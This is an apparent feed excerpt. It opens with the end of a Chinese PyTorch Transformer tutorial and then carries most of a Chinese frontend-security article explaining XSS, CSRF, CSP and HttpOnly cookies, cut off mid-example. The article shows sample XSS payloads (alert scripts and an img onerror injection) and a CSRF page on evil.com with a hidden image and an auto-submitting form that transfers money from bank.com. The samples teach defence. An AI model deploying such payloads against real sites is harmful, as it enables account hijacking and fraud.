class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span></span></span></span></span></p>
<pre><code class="hljs language-python" lang="python">decoder_layer = nn.TransformerDecoderLayer(d_model=<span class="hljs-number">12</span>, nhead=<span class="hljs-number">4</span>,batch_first=<span class="hljs-literal">True</span>)
Y_out = torch.rand(<span class="hljs-number">2</span>, <span class="hljs-number">10</span>, <span class="hljs-number">12</span>)
X = torch.rand(<span class="hljs-number">2</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span>)   <span class="hljs-comment"># 注意两个序列长度可以不一样</span>
seq_len = <span class="hljs-number">20</span>
mask = torch.triu(torch.ones(seq_len, seq_len), diagonal=<span class="hljs-number">1</span>).<span class="hljs-built_in">bool</span>()  <span class="hljs-comment"># 加掩码，当然也可以不加，主要看你的任务是什么</span>
output = decoder_layer(X, Y_out,tgt_mask=mask)
output.shape	<span class="hljs-comment"># 输出(2,20,12)</span>
</code></pre>
<p><strong>a2.4 TransformerDecoder</strong></p>
<p>多个TransformerDecoderLayer堆叠结构</p>
<p><strong>初始化参数：</strong></p>
<ul>
<li>
<p><code>encoder_layer</code>: 一个TransformerDecoderLayer层实例</p>
</li>
<li>
<p><code>num_layers</code>: 几个TransformerDecoderLayer层堆叠</p>
</li>
</ul>
<p>使用方法和TransformerEncoder同理，不在此过多介绍</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[XSS、CSRF、CSP、HttpOnly 全扫盲：前端安全不只是后端的事]]></title>    <link>https://juejin.cn/post/7583615094363193398</link>    <guid>https://juejin.cn/post/7583615094363193398</guid>    <pubDate>2025-12-15T08:13:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583615094363193398" data-draft-id="7583845695196790838" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="XSS、CSRF、CSP、HttpOnly 全扫盲：前端安全不只是后端的事"/> <meta itemprop="keywords" content="前端,后端,面试"/> <meta itemprop="datePublished" content="2025-12-15T08:13:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="也无风雨也雾晴"/> <meta itemprop="url" content="https://juejin.cn/user/2175258804632332"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            XSS、CSRF、CSP、HttpOnly 全扫盲：前端安全不只是后端的事
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2175258804632332/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    也无风雨也雾晴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T08:13:58.000Z" title="Mon Dec 15 2025 08:13:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读17分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>前端安全这事，很多人觉得是后端的活，或者觉得自己的项目没那么重要不会被攻击。但现实是，XSS、CSRF 这些漏洞在野外太常见了，而且很多时候攻击者就是用自动化工具扫的，不挑项目大小。</p>
<p>这篇文章把前端常见的安全问题捋一遍，每个问题讲清楚原理、攻击方式和防护手段。</p>
<hr/>
<h2 data-id="heading-0">XSS：最常见的前端漏洞</h2>
<p>XSS（Cross-Site Scripting，跨站脚本攻击）的核心就是把恶意脚本注入到网页里，让浏览器把它当正常代码执行。攻击者可以偷 Cookie、劫持会话、钓鱼、甚至发起蠕虫攻击。</p>
<h3 data-id="heading-1">三种常见类型</h3>
<p>三种 XSS 的攻击链路长这样：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph 存储型XSS
        A1[攻击者提交恶意评论] --&gt; A2[恶意代码存入数据库]
        A2 --&gt; A3[用户访问页面]
        A3 --&gt; A4[服务器返回含恶意代码的页面]
        A4 --&gt; A5[浏览器执行恶意脚本]
    end

    subgraph 反射型XSS
        B1[攻击者构造恶意URL] --&gt; B2[诱导用户点击]
        B2 --&gt; B3[服务器将参数反射到页面]
        B3 --&gt; B4[浏览器执行恶意脚本]
    end

    subgraph DOM型XSS
        C1[攻击者构造恶意URL] --&gt; C2[诱导用户点击]
        C2 --&gt; C3[前端JS读取URL参数]
        C3 --&gt; C4[直接操作DOM插入恶意代码]
        C4 --&gt; C5[浏览器执行恶意脚本]
    end
</code></pre>
<p><strong>存储型 XSS</strong></p>
<p>恶意代码被存到数据库里，每次访问都会执行。比如论坛的评论功能，攻击者提交一条包含恶意脚本的评论，其他用户一看评论就中招。这种危害最大，影响所有访问该页面的用户。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 危险的写法</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">renderComment</span>(<span class="hljs-params">comment</span>) {
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'comment'</span>).<span class="hljs-property">innerHTML</span> = comment.<span class="hljs-property">content</span>;
}
</code></pre>
<p><strong>反射型 XSS</strong></p>
<p>恶意代码在 URL 参数里，服务器把参数原样返回到页面。常见于搜索功能：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// URL: https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</span>

<span class="hljs-comment">// 服务器返回</span>
&lt;div&gt;搜索结果：&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">'XSS'</span>)&lt;<span class="hljs-regexp">/script&gt;&lt;/</span>div&gt;
</code></pre>
<p>攻击者需要诱导用户点击特定链接才能触发，但传播性很强，可以通过钓鱼邮件、社交媒体等方式大量散播。</p>
<p><strong>DOM 型 XSS</strong></p>
<p>纯前端的问题，不经过服务器。直接用 URL 参数操作 DOM：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// URL: https://example.com#&lt;img src=x onerror=alert('XSS')&gt;</span>

<span class="hljs-keyword">const</span> hash = location.<span class="hljs-property">hash</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>);
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'output'</span>).<span class="hljs-property">innerHTML</span> = hash;  <span class="hljs-comment">// 中招了</span>
</code></pre>
<h3 data-id="heading-2">防御 XSS 的完整方案</h3>
<p><strong>1. 输出编码（根据上下文选择）</strong></p>
<p>不同位置需要不同的编码方式：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// HTML 上下文：转义 &amp; &lt; &gt; " '</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeHtml</span>(<span class="hljs-params">str</span>) {
  <span class="hljs-keyword">const</span> map = {
    <span class="hljs-string">'&amp;'</span>: <span class="hljs-string">'&amp;amp;'</span>,
    <span class="hljs-string">'&lt;'</span>: <span class="hljs-string">'&amp;lt;'</span>,
    <span class="hljs-string">'&gt;'</span>: <span class="hljs-string">'&amp;gt;'</span>,
    <span class="hljs-string">'"'</span>: <span class="hljs-string">'&amp;quot;'</span>,
    <span class="hljs-string">"'"</span>: <span class="hljs-string">'&amp;#x27;'</span>
  };
  <span class="hljs-keyword">return</span> str.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[&amp;&lt;&gt;"']/g</span>, <span class="hljs-function">(<span class="hljs-params">char</span>) =&gt;</span> map[char]);
}

<span class="hljs-comment">// URL 参数：使用 encodeURIComponent</span>
<span class="hljs-keyword">const</span> url = <span class="hljs-string">`https://example.com/search?q=<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(userInput)}</span>`</span>;

<span class="hljs-comment">// JavaScript 字符串：使用 JSON.stringify 或 Unicode 编码</span>
<span class="hljs-keyword">const</span> safeStr = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(userInput);

<span class="hljs-comment">// CSS 上下文：转义特殊字符或禁止用户输入影响样式</span>
<span class="hljs-comment">// 最好别让用户输入直接影响 CSS</span>
</code></pre>
<p>实际使用：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 使用</span>
element.<span class="hljs-property">innerHTML</span> = escapeHtml(userInput);
</code></pre>
<p><strong>2. 使用安全的 API</strong></p>
<p>不要用 <code>innerHTML</code>，用 <code>textContent</code> 或 <code>innerText</code>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 危险</span>
element.<span class="hljs-property">innerHTML</span> = userInput;

<span class="hljs-comment">// 安全</span>
element.<span class="hljs-property">textContent</span> = userInput;

<span class="hljs-comment">// Vue/React 里也一样</span>
<span class="hljs-comment">// 危险：&lt;div v-html="userInput"&gt;&lt;/div&gt;</span>
<span class="hljs-comment">// 安全：&lt;div&gt;{{ userInput }}&lt;/div&gt;</span>
</code></pre>
<p>现代框架（React、Vue、Angular）默认会做转义，但要注意"逃生舱口"：</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// React - 危险的 API</span>
&lt;div dangerouslySetInnerHTML={{ <span class="hljs-attr">__html</span>: userContent }} /&gt;

<span class="hljs-comment">// Vue - 危险的指令</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-html</span>=<span class="hljs-string">"userContent"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>

<span class="hljs-comment">// Angular - 危险的方式</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> [<span class="hljs-attr">innerHTML</span>]=<span class="hljs-string">"userContent"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>

<span class="hljs-comment">// 这些地方需要手动净化</span>
</code></pre>
<p><strong>3. HTML 净化库</strong></p>
<p>如果必须渲染富文本（比如博客、论坛的富文本编辑器），用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcure53%2FDOMPurify" target="_blank" title="https://github.com/cure53/DOMPurify" ref="nofollow noopener noreferrer">DOMPurify</a> 清理：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">DOMPurify</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'dompurify'</span>;

<span class="hljs-keyword">const</span> dirty = <span class="hljs-string">'&lt;img src=x onerror=alert("XSS")&gt;'</span>;
<span class="hljs-keyword">const</span> clean = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(dirty);
element.<span class="hljs-property">innerHTML</span> = clean;  <span class="hljs-comment">// 安全</span>

<span class="hljs-comment">// 配置允许的标签和属性</span>
<span class="hljs-keyword">const</span> clean2 = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(dirty, {
  <span class="hljs-attr">ALLOWED_TAGS</span>: [<span class="hljs-string">'p'</span>, <span class="hljs-string">'strong'</span>, <span class="hljs-string">'em'</span>, <span class="hljs-string">'a'</span>],
  <span class="hljs-attr">ALLOWED_ATTR</span>: [<span class="hljs-string">'href'</span>, <span class="hljs-string">'title'</span>]
});
</code></pre>
<p>DOMPurify 会移除所有潜在危险的标签和属性（<code>&lt;script&gt;</code>、<code>onerror</code>、<code>javascript:</code> 等），同时保留合法的 HTML 结构。</p>
<p><strong>4. HttpOnly Cookie</strong></p>
<p>设置 Cookie 时加上 <code>HttpOnly</code>，JavaScript 就读不到，XSS 攻击也偷不走：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 后端设置</span>
res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'sessionId'</span>, <span class="hljs-string">'xxx'</span>, {
  <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,    <span class="hljs-comment">// JavaScript 访问不到</span>
  <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>,      <span class="hljs-comment">// 只在 HTTPS 下发送</span>
  <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'strict'</span> <span class="hljs-comment">// 跨站请求不发送</span>
});
</code></pre>
<p><strong>5. Content Security Policy (CSP)</strong></p>
<p>CSP 是浏览器级别的防护，通过 HTTP 响应头限制页面能加载哪些资源。设置好 CSP，即使有 XSS 漏洞，攻击者也很难利用。</p>
<p>通过 HTTP 响应头设置：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-attribute">Content</span>-Security-Policy: default-src <span class="hljs-string">'self'</span>; script-<span class="hljs-attribute">src</span> 'self' 'nonce-abc123'; style-<span class="hljs-attribute">src</span> 'self' 'unsafe-inline'; <span class="hljs-selector-tag">img</span>-<span class="hljs-attribute">src</span> *; <span class="hljs-selector-tag">object</span>-<span class="hljs-attribute">src</span> '<span class="hljs-attribute">none</span>'
</code></pre>
<p>或者用 meta 标签：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"Content-Security-Policy"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"default-src 'self'; script-src 'self' https://trusted.com"</span>&gt;</span>
</code></pre>
<p>这个策略的意思是：</p>
<ul>
<li><code>default-src 'self'</code>：默认只能加载同源资源</li>
<li><code>script-src 'self' 'nonce-abc123'</code>：脚本只能来自同源或带有特定 nonce 的内联脚本</li>
<li><code>object-src 'none'</code>：禁止 <code>&lt;object&gt;</code>、<code>&lt;embed&gt;</code> 标签</li>
</ul>
<p><strong>CSP 指令详解</strong></p>
<pre><code class="hljs language-perl" lang="perl">Content-Security-Policy:
  default-src <span class="hljs-string">'none'</span>;                                 <span class="hljs-comment"># 默认禁止所有</span>
  script-src <span class="hljs-string">'self'</span> <span class="hljs-string">'nonce-randomvalue'</span> https:<span class="hljs-regexp">//</span>cdn.example.com;  <span class="hljs-comment"># 脚本来源</span>
  style-src <span class="hljs-string">'self'</span> <span class="hljs-string">'nonce-randomvalue'</span>;               <span class="hljs-comment"># 样式来源</span>
  img-src <span class="hljs-string">'self'</span> data: https:;                        <span class="hljs-comment"># 图片来源</span>
  font-src <span class="hljs-string">'self'</span> https:<span class="hljs-regexp">//</span>fonts.gstatic.com;          <span class="hljs-comment"># 字体来源</span>
  <span class="hljs-keyword">connect</span>-src <span class="hljs-string">'self'</span>;                                 <span class="hljs-comment"># Ajax/WebSocket 连接</span>
  frame-ancestors <span class="hljs-string">'none'</span>;                             <span class="hljs-comment"># 防止被嵌入 iframe</span>
  base-uri <span class="hljs-string">'self'</span>;                                    <span class="hljs-comment"># 限制 &lt;base&gt; 标签</span>
  form-action <span class="hljs-string">'self'</span>;                                 <span class="hljs-comment"># 表单提交地址</span>
</code></pre>
<p>关键点：</p>
<ul>
<li>避免使用 <code>'unsafe-inline'</code> 和 <code>'unsafe-eval'</code>，它们会削弱 CSP 保护</li>
<li>用 <code>nonce</code> 或 <code>hash</code> 代替 <code>unsafe-inline</code></li>
<li><code>frame-ancestors</code> 防止点击劫持</li>
<li>配置 <code>report-uri</code> 收集违规报告</li>
</ul>
<p><strong>nonce 的正确用法</strong></p>
<p>服务器为每个请求生成随机 nonce，内联脚本必须匹配：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 服务器每次请求生成新的 nonce --&gt;</span>
<span class="hljs-comment">&lt;!-- 响应头 --&gt;</span>
Content-Security-Policy: script-src 'nonce-abc123'

<span class="hljs-comment">&lt;!-- HTML --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">"abc123"</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Allowed'</span>);  <span class="hljs-comment">// 这个脚本可以执行</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Blocked'</span>);  <span class="hljs-comment">// 攻击者注入的脚本，没有 nonce，被拦截</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>后端生成 nonce 的示例：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Express 中间件</span>
<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">'crypto'</span>);

app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  <span class="hljs-comment">// 每次请求生成新的 nonce</span>
  res.<span class="hljs-property">locals</span>.<span class="hljs-property">nonce</span> = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">'base64'</span>);
  res.<span class="hljs-title function_">setHeader</span>(
    <span class="hljs-string">'Content-Security-Policy'</span>,
    <span class="hljs-string">`script-src 'nonce-<span class="hljs-subst">${res.locals.nonce}</span>'`</span>
  );
  <span class="hljs-title function_">next</span>();
});
</code></pre>
<p><strong>Report-Only 模式</strong></p>
<p>先用 <code>Content-Security-Policy-Report-Only</code> 测试，不会真的阻止资源，只是上报违规：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-attribute">Content</span>-Security-Policy-Report-Only: default-src <span class="hljs-string">'self'</span>; report-uri /csp-report
</code></pre>
<p>看看有哪些资源违规，调整策略后再正式启用。</p>
<hr/>
<h2 data-id="heading-3">CSRF：借刀杀人</h2>
<p>CSRF（Cross-Site Request Forgery，跨站请求伪造）的原理是：用户登录了 A 网站，Cookie 里有会话信息。用户访问恶意网站 B，B 网站向 A 发请求，浏览器会自动带上 A 的 Cookie，A 网站以为是用户本人的操作。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant 用户
    participant 银行网站
    participant 恶意网站

    用户-&gt;&gt;银行网站: 1. 登录银行网站
    银行网站-&gt;&gt;用户: 2. 返回会话Cookie
    用户-&gt;&gt;恶意网站: 3. 访问恶意网站
    恶意网站-&gt;&gt;用户: 4. 页面包含隐藏请求
    用户-&gt;&gt;银行网站: 5. 浏览器自动发送请求(带Cookie)
    银行网站-&gt;&gt;银行网站: 6. 验证Cookie有效，执行转账
    Note over 用户: 用户完全不知情
</code></pre>
<h3 data-id="heading-4">攻击示例</h3>
<p>用户登录了银行网站 <code>bank.com</code>，Cookie 还有效。这时候访问了恶意网站 <code>evil.com</code>，恶意网站里有这样一段代码：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 方式1：隐藏图片 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://bank.com/transfer?to=attacker&amp;amount=1000"</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 方式2：自动提交表单 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"https://bank.com/transfer"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"evilForm"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"to"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"attacker"</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"amount"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"10000"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'evilForm'</span>).<span class="hljs-title function_">submit</span>();</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>浏览器会自动带上 <code>bank.com</code> 的 Cookie 发请求，钱就转走了。用户完全不知情。</p>
<h3 data-id="heading-5">防御 CSRF 的完整方案</h3>
<p><strong>1. CSRF Token（最可靠）</strong></p>
<p>服务器生成一个随机 token，存在 session 里，同时放到页面的隐藏字段或请求头中。提交时验证 token 是否匹配。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 前端从页面获取 token</span>
<span class="hljs-keyword">const</span> csrfToken = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'meta[name="csrf-token"]'</span>).<span class="hljs-property">content</span>;

<span class="hljs-comment">// 方式1：放在请求头</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/transfer'</span>, {
  <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
  <span class="hljs-attr">headers</span>: {
    <span class="hljs-string">'X-CSRF-Token'</span>: csrfToken,
    <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>
  },
  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-attr">to</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">amount</span>: <span class="hljs-number">100</span> })
});

<span class="hljs-comment">// 方式2：放在表单隐藏字段</span>
<span class="hljs-comment">// &lt;input type="hidden" name="_csrf" value="token-from-server"&gt;</span>
</code></pre>
<p>后端验证：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Express 示例</span>
<span class="hljs-keyword">const</span> csrf = <span class="hljs-built_in">require</span>(<span class="hljs-string">'csurf'</span>);
<span class="hljs-keyword">const</span> csrfProtection = <span class="hljs-title function_">csrf</span>({ <span class="hljs-attr">cookie</span>: <span class="hljs-literal">true</span> });

app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/transfer'</span>, csrfProtection, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  <span class="hljs-comment">// token 验证通过才会到这里</span>
  <span class="hljs-comment">// 执行转账逻辑</span>
});
</code></pre>
<p>攻击者没法获取这个 token（跨域拿不到页面内容），伪造的请求就会失败。</p>
<p><strong>2. SameSite Cookie（现代浏览器默认防护）</strong></p>
<p>Cookie 加上 <code>SameSite</code> 属性，跨站请求就不会带 Cookie：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 后端设置</span>
res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'sessionId'</span>, <span class="hljs-string">'xxx'</span>, {
  <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'strict'</span>  <span class="hljs-comment">// 或者 'lax'</span>
});
</code></pre>
<p>三个值的区别：</p>
<ul>
<li><code>Strict</code>：跨站请求完全不发送 Cookie，最安全但可能影响用户体验（从外部链接点进来也没 Cookie，需要重新登录）</li>
<li><code>Lax</code>：GET 请求的顶级导航可以发送（比如点链接），POST 不发送。大多数场景够用，Chrome 80 之后的默认值</li>
<li><code>None</code>：都发送，但必须配合 <code>Secure</code>（仅 HTTPS）</li>
</ul>
<p>实际效果：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 用户在 bank.com 登录，Cookie 设置为 SameSite=Strict</span>

<span class="hljs-comment">// 场景1：从外部链接（evil.com）点击跳转到 bank.com</span>
